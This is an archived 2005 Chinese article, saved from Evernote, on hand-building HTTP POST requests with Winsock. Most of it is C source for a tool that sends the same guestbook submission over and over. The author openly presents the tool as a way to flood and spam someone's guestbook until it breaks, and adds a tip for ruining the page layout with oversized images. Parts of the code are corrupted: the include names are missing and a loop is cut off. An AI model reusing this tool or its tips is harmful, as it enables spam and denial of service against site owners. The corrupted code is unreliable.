@@ -1,0 +1,291 @@
+<html>
+<head>
+  <title>用Winsock实现对网站数据库的数据注入</title>
+  <basefont face="Tahoma" size="2" />
+  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+  <meta name="exporter-version" content="Evernote Windows/267864 (zh-CN); Windows/6.1.7601 Service Pack 1;"/>
+  <style>
+    body, td {
+      font-family: Tahoma;
+      font-size: 10pt;
+    }
+  </style>
+</head>
+<body>
+<a name="1220"/>
+<h1>用Winsock实现对网站数据库的数据注入</h1>
+
+<div>
+<div style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space;">
+用Winsock实现对网站数据库的数据注入<br>
+来源：情感网络 作者：情感网络 时间：2005-06-14 04:58:28<br>
+分享到：<br><br><br>
+在写这篇文章之前，有必要对“注入”一词阐述一下。区别于通常的SQL注入，这里的注入实际上只是构造HTTP请求报文，以程序的方式代替WEB提交页面，实现数据的自动提交。嘿嘿，说到这，我看到你诡异的笑容了，我们只要写个循环，用什么语言你说了算，向特定的WEB页面发送HTTP报文，只要几分钟，呵呵他的本本就爆了，而且……嘿、嘿、嘿……偶喝杯茶，接下再写。 <br><br>
+    首先，还是温习一下HTTP协议吧。我们在打开一个网站时，比如说http://www.163.com，实际上IE作为一个客户端，它将向服务器发送如下的请求报文（偶用sniffer截得的）： <br><br>
+GET / HTTP/1.1 <br>
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms- <br>
+powerpoint, application/vnd.ms-excel, application/msword, application/x-shockwave-flash, */* <br>
+Accept-Language: zh-cn <br>
+Accept-Encoding: gzip, deflate <br>
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0) <br>
+Host: www.163.com <br>
+Connection: Keep-Alive <br>
+Cookie: NETEASE_SSN=jsufcz; NETEASE_ADV=11&amp;22; Province=0; City=0; NTES_UV_COOKIE=YES <br><br>
+我们看到在以上的报文中，有很多字段，当然其中有很多并不是必须的，如果我们自己编程，只关心必要的就行了。在HTTP/1.1协议中规定了最小请求消息由方法字段（GET/POST/HEAD）和主机字段（HOST）构成。如上面的 <br>
+GET / HTTP/1.1 <br>
+HOST:www.163.com <br>
+但在HTTP/1.0中，HOST字段并不是必须的，这里为什么不能省，相信你也知道，不晓得的话也不打紧，接下来看。 <br><br>
+    为了向服务器发送数据，浏览器通常采用GET或POST方法向服务器提交报文。服务器在收到报文之后，解码分析出所需的数据并进行处理，最后返回结果。通常我们可以见到诸如http://xxx.xxx.xxx.xxx/show.asp?id=xxx的URL请求，我们可以自己构造如下的报文来完成 <br><br>
+GET /show.asp?id=xxx HTTP/1.1 <br>
+HOST:xxx.xxx.xxx.xxx <br><br>
+受URL长度1024的限制，采用GET方法只能提交少量的数据，假如我们在录入一篇文章时，这时就只能用到POST方法了。在讲解POST方法的一些要点之前，还是让大家来看一段POST请求报文，以致对POST报文有个大致的了解。（下面是我向某本本的留言，偶照样用sniffer截下来了） <br><br>
+POST /gbook/add.php HTTP/1.1 <br>
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms- <br>
+powerpoint, application/vnd.ms-excel, application/msword, application/x-shockwav <br>
+e-flash, */* <br>
+Referer: http://218.76.65.47/gbook/add.php <br>
+Accept-Language: zh-cn <br>
+Content-Type: application/x-www-form-urlencoded <br>
+Accept-Encoding: gzip, deflate <br>
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0) <br>
+Host: 218.76.65.47 <br>
+Content-Length: 115 <br>
+Connection: Keep-Alive <br><br>
+name=test&amp;email=&amp;comefrom=&amp;homepage=&amp;icq=&amp;oicq=&amp;image=say.gif&amp;comment=test&amp;passw <br>
+ord=&amp;doadd=%B7%A2%CB%CD%C1%F4%D1%D4 <br><br>
+与GET方法相比，在字段下面多了一段内容，这就是我们向留言本提交的数据，如果有中文须经过urlencode编码。同样让我们省去不必要的字段，构造一个最小的POST请求 <br><br>
+POST /gbook/add.php HTTP/1.1 <br>
+Host: 218.76.65.47 <br>
+Content-Type: application/x-www-form-urlencoded <br>
+Content-Length: 115 <br><br>
+name=test&amp;email=&amp;comefrom=&amp;homepage=&amp;icq=&amp;oicq=&amp;image=say.gif&amp;comment=test&amp;passw <br>
+ord=&amp;doadd=%B7%A2%CB%CD%C1%F4%D1%D4 <br><br>
+上面的Content-Type字段表示为POST表单型的，Content-Length当然就是表示实体数据的长度了，这里都不能少，不然就无法正确接收了。这样，服务器端处理页面就会收到你提交的数据，并接收处理，如果是留言本的话就写入数据库了。若以很快的速度向某个本本发送这样的报文，实际上那个本本己经被你狂灌水了。 <br><br>
+    呜呜呜，看上面偶都不知道讲了些什么，乱不拉几的，就是偶也想尽量讲得清楚点，无耐高考语文没及格，就成这样了咯，还望哥哥姐姐们见谅见谅。讲了客户端的发送，接下来就该讲服务器的接收问题了。 <br><br>
+    当报文数据到达服务器后，服务器底层进程进行接收并放入特定的缓冲区，同时置一些环境变量，如“CONTENT_LENGTH“、”QUERY_STRING“等，当然这其间还是屏蔽了一些底层细节的，如客户端提交的数据是怎么被重置到被请求页的标准输入的，偶也弄不清楚，嘿嘿要能弄清楚了，偶就写操作系统去。之后高层应用程序如CGI、ASP、PHP等对其进行数据提取，其中CGI还须自己进行Unencode解码和字符串提取。假如向一ASP本本写留言，我提交了姓名（name）和内容（body）字段，且采用POST表单方式提交，在ASP程序中应如下进行接收： <br>
+name=request.form(&quot;name&quot;) <br>
+body=request.form(&quot;body&quot;) <br>
+并添加到数据库中 <br>
+rs.addnew <br>
+rs(&quot;name&quot;)=name <br>
+rs(&quot;body&quot;)=body <br>
+rs.update <br><br>
+    到此，该讲的也基本上讲完了，但有一点还要注意下，在发送报文时，在实体内容中还须加入提交按钮的“name=value“URLEncode编码，否则有可能不会写入数据库，Why ?I am finding the reason! <br><br>
+  <br><br>
+  <br><br>
+以下是相关的源代码： <br>
+代码: [拷贝到剪切板] <br>
+/*    encode.h    */ <br><br>
+/* Unencode URL编码函数 */ <br>
+/* <br>
+在这里要注意，编译器在处理中文字符时，会自动根据字符的位7来读入一个 <br>
+或两个字符，这时可以强制采用unsigned char *来读入一个字符。 <br>
+*/ <br><br>
+int isT(char ch) <br>
+{ <br>
+    if(ch==’ ’||ch==’%’||ch==’/’||ch&amp;0x80) return 1; <br>
+    else return 0; <br>
+} <br><br>
+int encode(char *s,char *d) <br>
+{ <br>
+    if(!s||!d) return 0; <br>
+    for(;*s!=0;s++) <br>
+    { <br>
+        unsigned char *p=(unsigned char*)s; <br>
+        if(*p==’ ’) <br>
+        { <br>
+           *d=’%’; <br>
+       *(d+1)=’2’; <br>
+       *(d+2)=’0’; <br>
+       d+=3; <br>
+        } <br>
+        else if(isT(*p)) <br>
+        { <br>
+            char a[3]; <br>
+            *d=’%’; <br>
+            sprintf(a,&quot;%02x&quot;,*p); <br>
+            *(d+1)=a[0]; <br>
+            *(d+2)=a[1]; <br>
+            d+=3; <br>
+        } <br>
+        else <br>
+        { <br>
+            *d=*p; <br>
+            d++; <br>
+        } <br>
+    } <br>
+    *d=0; <br>
+    return 1; <br>
+} <br><br><br>
+/* Unencode URL解码函数 */ <br><br>
+int unencode(char *s,char *d) <br>
+{ <br>
+    if(!s||!d) return 0; <br>
+    for(;*s!=0;s++) <br>
+    { <br>
+        if(*s==’+’) <br>
+        { <br>
+            *d=’ ’; <br>
+            d++; <br>
+        } <br>
+        else if(*s==’%’) <br>
+        { <br>
+            int code; <br>
+            if(sscanf(s+1,&quot;%02x&quot;,&amp;code)!=1) code=’?’; <br>
+            *d=code; <br>
+            s+=2; <br>
+            d++; <br>
+        } <br>
+        else <br>
+        { <br>
+            *d=*s; <br>
+            d++; <br>
+        } <br>
+    } <br>
+    *d=0; <br>
+    return 1; <br>
+} <br><br>
+/*  booksend.cpp  */ <br><br>
+/*    报文发送程序    */ <br><br>
+#include  <br>
+#include  <br>
+#include &quot;encode.h&quot; <br>
+#include  <br><br>
+#pragma comment(lib,&quot;ws2_32.lib&quot;) <br><br>
+int checkpra(int argc,char *argv[]); <br>
+void usage(); <br>
+DWORD WINAPI senddata(LPVOID lp); <br><br>
+char ip[20]={0}; <br>
+USHORT port=0; <br>
+char page[128]={0}; <br>
+char value[1024]={0}; <br>
+int ttime=1; <br>
+int delaytime=2000; <br>
+SOCKET sock; <br>
+struct sockaddr_in sin; <br>
+char sendbuf[1024*4]={0}; <br><br>
+void main(int argc,char *argv[]) <br>
+{ <br>
+    if(checkpra(argc,argv)==-1) return; <br><br>
+    WSADATA wsa; <br>
+    if(WSAStartup(0x0202,&amp;wsa)!=0) <br>
+    { <br>
+        printf(&quot;WSAStartup failed with error:%d\n&quot;,GetLastError()); <br>
+        return; <br>
+    } <br><br>
+    sin.sin_family=AF_INET; <br>
+    if(inet_addr(ip)!=INADDR_NONE) <br>
+        sin.sin_addr.s_addr=inet_addr(ip); <br>
+    else <br>
+    { <br>
+        struct hostent *phost=gethostbyname(ip); <br>
+        if(phost==NULL) <br>
+        { <br>
+            printf(&quot;Resolve %s error!\n&quot;,ip); <br>
+            return; <br>
+        } <br>
+        memcpy(&amp;sin.sin_addr,phost-&gt;h_addr_list[0],phost-&gt;h_length); <br>
+    } <br>
+    sin.sin_port=htons(port); <br><br>
+    char tempbuf[1024]={0}; <br>
+    sprintf(tempbuf,&quot;POST %s HTTP/1.1\n&quot;,page); <br>
+    strcpy(sendbuf,tempbuf); <br>
+    memset(tempbuf,0,sizeof(tempbuf)); <br>
+    sprintf(tempbuf,&quot;HOST: %s\n&quot;,ip); <br>
+    strcat(sendbuf,tempbuf); <br>
+    strcat(sendbuf,&quot;Accept: image/gif, */*\n&quot;); <br>
+    strcat(sendbuf,&quot;Content-Type: application/x-www-form-urlencoded\n&quot;); <br>
+    memset(tempbuf,0,sizeof(tempbuf)); <br>
+    sprintf(tempbuf,&quot;Content-Length: %d\n&quot;,strlen(value)); <br>
+    strcat(sendbuf,tempbuf); <br>
+    strcat(sendbuf,&quot;Connection: Keep-Alive\n\n&quot;); <br>
+    strcat(sendbuf,value); <br><br>
+    for(int i=0;i     { <br>
+        CreateThread(NULL,0,senddata,&amp;i,0,NULL); <br>
+        Sleep(delaytime); <br>
+    } <br>
+    WSACleanup(); <br>
+} <br><br>
+DWORD WINAPI senddata(LPVOID lp) <br>
+{ <br>
+    SOCKET sock=socket(AF_INET,SOCK_STREAM,0); <br>
+    if(sock==INVALID_SOCKET) <br>
+    { <br>
+        printf(&quot;Socket() failed with error:%d\n&quot;,GetLastError()); <br>
+        return -1; <br>
+    } <br>
+    int ret; <br>
+    printf(&quot;State:Connecting...\n&quot;); <br>
+    ret=connect(sock,(struct sockaddr*)&amp;sin,sizeof(sin)); <br>
+    if(ret==SOCKET_ERROR) <br>
+    { <br>
+        printf(&quot;Connect() failed with error:%d\n&quot;,GetLastError()); <br>
+        return -1; <br>
+    } <br>
+    printf(&quot;State:Connected!\n&quot;); <br>
+    printf(&quot;State:Sending...time %d &quot;,*(int*)lp+1); <br>
+    ret=send(sock,sendbuf,strlen(sendbuf)+1,0); <br>
+    if(ret&gt;0) <br>
+        printf(&quot;Send success!\n&quot;); <br>
+    else <br>
+        printf(&quot;Send error!\n&quot;); <br><br>
+    char recvbuf[1024*10]={0}; <br>
+    ret=recv(sock,recvbuf,sizeof(recvbuf),0); <br>
+    if(strstr(recvbuf,&quot;100&quot;)||strstr(recvbuf,&quot;200&quot;)||strstr(recvbuf,&quot;302&quot;)) <br>
+        printf(&quot;呵呵，注入成功啦!\n\n&quot;); <br>
+    else <br>
+        printf(&quot;注入有点问题哦，请查实一下!\n\n&quot;); <br>
+    closesocket(sock); <br>
+    return 1; <br>
+} <br><br>
+void usage() <br>
+{ <br>
+    char pathname[128]={0}; <br>
+    GetModuleFileName(NULL,pathname,sizeof(pathname)); <br>
+    char *p=pathname+strlen(pathname)-1; <br>
+    for(;*p!=’\\’;p--); <br>
+  printf(&quot;-------------------------------------------------------------------------------\n&quot;); <br>
+  printf(&quot;Usage:%s ip port page value [times] [delay]\n&quot;,p+1); <br>
+  printf(&quot;Code by JsuFcz--http://jsufcz.21xcn.net\n&quot;); <br>
+  printf(&quot;Ex:%s 10.0.0.169 80 /guestbk/add.php name=abc-body=hehe-doadd=发送留言&quot;,p+1); <br>
+  printf(&quot;-------------------------------------------------------------------------------\n&quot;); <br>
+} <br><br>
+int checkpra(int argc,char *argv[]) <br>
+{ <br>
+    if(argc&lt;5) <br>
+    { <br>
+        printf(&quot;错误的用法：至少应使用4个参数\n\n&quot;); <br>
+        usage(); <br>
+        return -1; <br>
+    } <br>
+    else if(argc&gt;6) <br>
+    { <br>
+        printf(&quot;错误的用法：最多只有6个参数\n\n&quot;); <br>
+        usage(); <br>
+        return -1; <br>
+    } <br>
+    if(argc==6) <br>
+    { <br>
+        ttime=atoi(argv[5]); <br>
+    } <br>
+    if(argc==7) <br>
+    { <br>
+        ttime=atoi(argv[5]); <br>
+        delaytime=atoi(argv[6]); <br>
+    } <br>
+    strcpy(ip,argv[1]); <br>
+    port=atoi(argv[2]); <br>
+    strcpy(page,argv[3]); <br>
+    for(int i=0;argv[4][i]!=0;i++) <br>
+    { <br>
+        if(argv[4][i]==’-’) argv[4][i]=’&amp;’; <br>
+        if(argv[4][i]==’\’’) argv[4][i]=’ ’; <br>
+    } <br>
+    encode(argv[4],value); <br>
+    return 0; <br>
+} <br>
+ <br><br><br>
+    以上代码已在VC6上编译通过，你也可以到本人个人主页上下载到源代码和命令行程序。 <br><br>
+    在文章的最后，偶还有一点心得要与大家分享。在留言本中如果有提交表情或是图片之类的，由于本本的相对链接的限制，只要是本本目录下的图片资源，偶们就可以随便拿来贴，这样如果某个图片的尽寸很大的话，本本的版面就被你弄坏了。  
+</div>
+</div></body></html> 
